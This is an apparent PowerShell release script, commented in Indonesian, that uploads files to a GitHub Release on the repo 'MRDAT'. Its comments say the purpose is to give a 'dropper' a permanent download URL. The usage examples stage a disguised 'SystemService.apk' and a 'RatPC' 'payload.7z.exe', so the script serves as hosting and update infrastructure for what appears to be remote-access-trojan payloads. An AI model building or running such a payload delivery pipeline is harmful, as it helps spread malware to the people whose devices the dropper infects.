# tools\release.ps1 - buat GitHub Release + unggah satu file sebagai aset.
#
# Kenapa lewat Release dan bukan commit biasa:
#   - URL aset stabil dan tidak berubah tiap versi:
#       https://github.com/<owner>/<repo>/releases/latest/download/<file>
#     Dropper cukup menyimpan satu URL itu selamanya.
#   - File 14 MB tidak masuk riwayat git (repo jadi lambat dan tidak bisa
#     di-clone cepat), tapi tetap publik dan bisa diunduh tanpa token.
#   - `latest` otomatis menunjuk rilis terbaru, jadi upgrade cukup unggah
#     aset baru dengan tag lebih tinggi.
#
# Token: JANGAN ditulis di file. Pakai environment variable.
#   $env:GITHUB_TOKEN = '<pat>'
#
# Pakai:
#   .\tools\release.ps1 -Tag v1.1 -File dist\SystemService.apk -Notes "build 1.1"
#   .\tools\release.ps1 -Tag v1.2 -File ..\RatPC\dist\payload.7z.exe -Name payload.7z.exe
#   .\tools\release.ps1 -Tag v1.1 -File ... -Draft     (uji tanpa publikasi)

param(
    [Parameter(Mandatory = $true)][string]$Tag,
    [Parameter(Mandatory = $true)][string]$File,
    [string]$Name = "",
    [string]$Title = "",
    [string]$Notes = "",
    [string]$Repo = "mamafidzifadza-png/MRDAT",
    [string]$Token = $env:GITHUB_TOKEN,
    [switch]$Draft
)

$ErrorActionPreference = "Stop"

if (-not (Test-Path $File)) { throw "file tidak ada: $File" }
if (-not $Token) { throw "token kosong. set `$env:GITHUB_TOKEN dulu" }
if (-not $Name) { $Name = Split-Path $File -Leaf }
if (-not $Title) { $Title = "$Tag" }

$api = "https://api.github.com"
$hdr = @{
    Authorization          = "Bearer $Token"
    "User-Agent"           = "curl/8.5.0"
    "Accept"               = "application/vnd.github+json"
    "X-GitHub-Api-Version" = "2022-11-28"
}
$json = @{ "Content-Type" = "application/json" }

$size = [math]::Round((Get-Item $File).Length / 1MB, 2)
$sha = (Get-FileHash $File -Algorithm SHA256).Hash.ToLower()
Write-Host "[*] repo   : $Repo"
Write-Host "[*] tag    : $Tag"
Write-Host "[*] file   : $File ($size MB)"
Write-Host "[*] sha256 : $sha"

# 1. pastikan rilis ada (atau pakai yang sudah ada untuk tag sama)
$rel = $null
try {
    $rel = Invoke-RestMethod -Method Get -Uri "$api/repos/$Repo/releases/tags/$Tag" -Headers $hdr
    Write-Host "[*] rilis $Tag sudah ada (id $($rel.id)), aset ditambahkan ke situ"
} catch {
    $body = @{
        tag_name         = $Tag
        name             = $Title
        body             = $Notes
        draft            = [bool]$Draft
        prerelease       = $false
        generate_release_notes = $false
    } | ConvertTo-Json
    $rel = Invoke-RestMethod -Method Post -Uri "$api/repos/$Repo/releases" -Headers ($hdr + $json) -Body $body
    Write-Host "[+] rilis dibuat (id $($rel.id), draft=$($Draft.IsPresent))"
}

# 2. unggah aset. Nama aset yang sama tidak bisa dua kali dalam satu rilis,
#    jadi dihapus dulu kalau sudah ada.
foreach ($a in @($rel.assets)) {
    if ($a.name -eq $Name) {
        Invoke-RestMethod -Method Delete -Uri "$api/repos/$Repo/releases/assets/$($a.id)" -Headers $hdr | Out-Null
        Write-Host "[*] aset lama '$Name' dihapus"
    }
}

$up = "https://uploads.github.com/repos/$Repo/releases/$($rel.id)/assets?name=$Name"
$res = Invoke-RestMethod -Method Post -Uri $up -Headers @{
    Authorization        = "Bearer $Token"
    "User-Agent"         = "curl/8.5.0"
    "Content-Type"       = "application/octet-stream"
} -InFile $File

Write-Host "[+] aset terunggah: $($res.name) ($([math]::Round($res.size/1MB,2)) MB)"
if ($Draft) {
    Write-Host "[!] masih DRAFT - tidak bisa diunduh publik sampai dipublikasikan"
} else {
    $url = "https://github.com/$Repo/releases/latest/download/$($res.name)"
    Write-Host "[+] url    : $url"
    Write-Host "[*] cek    : curl.exe -sIL `"$url`" | findstr /i `"HTTP/ content-length`""
}
